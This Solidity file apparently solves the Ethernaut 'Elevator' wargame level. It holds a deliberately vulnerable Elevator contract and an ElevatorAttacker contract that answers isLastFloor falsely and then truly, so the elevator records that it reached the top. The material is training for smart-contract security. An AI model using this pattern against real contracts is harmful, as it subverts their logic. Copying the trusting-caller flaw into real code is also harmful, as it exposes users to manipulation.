// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttacker is Building {
    Elevator immutable elevator;

    constructor(address _elevator){
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint _floor) external returns (bool){
        return elevator.floor() > 5 ? true : false;
    }

    function goTo(uint _floor) external {
        elevator.goTo(_floor);
    }

}